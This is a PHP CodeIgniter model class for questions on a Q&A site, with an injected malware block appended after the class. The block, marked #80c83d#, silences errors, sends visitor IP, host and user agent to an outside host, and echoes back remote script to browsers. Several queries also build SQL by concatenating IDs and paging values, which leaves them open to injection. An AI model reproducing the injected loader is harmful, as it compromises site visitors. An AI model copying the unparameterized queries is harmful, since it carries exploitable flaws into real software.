<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MbQuestionManager extends CI_Model {
	private $_TABLE_NAME = 'mb_question';

	function __construct()
	{
		parent::__construct();
	}
	
	public function getUserNameFromUserId($model) {
		//include_once 'mbquestionmanager.php';
		//$this->load->model("mbquestionmanager");
		$sql = "SELECT * FROM mb_user WHERE id_=".$model->getUserId();
		$query = $this->db->query($sql);
		$result = $query->result();
		return $result[0]->account_;
	}
	
	/**
	 * Select question model
	 * 
	 * Enter description here ...
	 * 
	 */
	
	public function select($limit,$offset) {
		$sql = "SELECT * FROM ".$this->_TABLE_NAME." q left join mb_category c on q.cat_id_=c.id_ ORDER BY q.date_ask_ DESC LIMIT ".$limit." OFFSET ".$offset;
		$query = $this->db->query($sql);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}
	
	public function selectbyid($qid) {
		$sql = "SELECT * FROM ".$this->_TABLE_NAME." q left join mb_category c on q.cat_id_=c.id_ WHERE qid_=".$qid;
		$query = $this->db->query($sql);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}
	
	public function selectbycid($cid) {
		$sql = "SELECT * FROM ".$this->_TABLE_NAME." q left join mb_category c on q.cat_id_=c.id_ WHERE c.id_=".$cid." LIMIT 10";
		$query = $this->db->query($sql);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}	
	
	public function getTotal() {
		$sql = "SELECT count(*) as count FROM ".$this->_TABLE_NAME;
		$query = $this->db->query($sql); 
		$dataResult = $query->result_array();
		return $dataResult[0]['count'];
	}
	
	/**
	 * Convert from Database Record to MbQuestionModel
	 * @param record $record
	 * @return MbQuestionModel
	 */
	
	protected function convert ($record) {
		$model = new MbQuestionModel();
		$model->setQid($record->qid_);
		$model->setTitle($record->title_);
		$model->setAskContent($record->ask_content_);
		$model->setDateAsk($record->date_ask_);
		$model->setUserId($record->userid_);
		$model->setCatId($record->cat_id_);
		$model->setCatName($record->name_);
		$username = $this->getUserNameFromUserId($model);
		$model->setUserName($username);
		return $model;
	}
	
	
	/**
	 * Insert into mb_question 
	 * Enter description here ...
	 * @param unknown_type $model
	 */
	
	public function _insert($model) {
		// connect to database
		// $this->load->database(); 
		$data = array(
			'title_' => $model->getTitle(),
			'date_ask_' => $model->getDateAsk(),
			'ask_content_' => $model->getAskContent(),
			'userid_' => $model->getUserId(),
			'cat_id_' => $model->getCatId()
		);
		$this->db->insert($this->_TABLE_NAME, $data); 
	}
	
	public function delete($model) {
		$this->db->where('qid_', $model->getQid());
		$this->db->delete($this->_TABLE_NAME);
	}
}

#80c83d#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/80c83d#

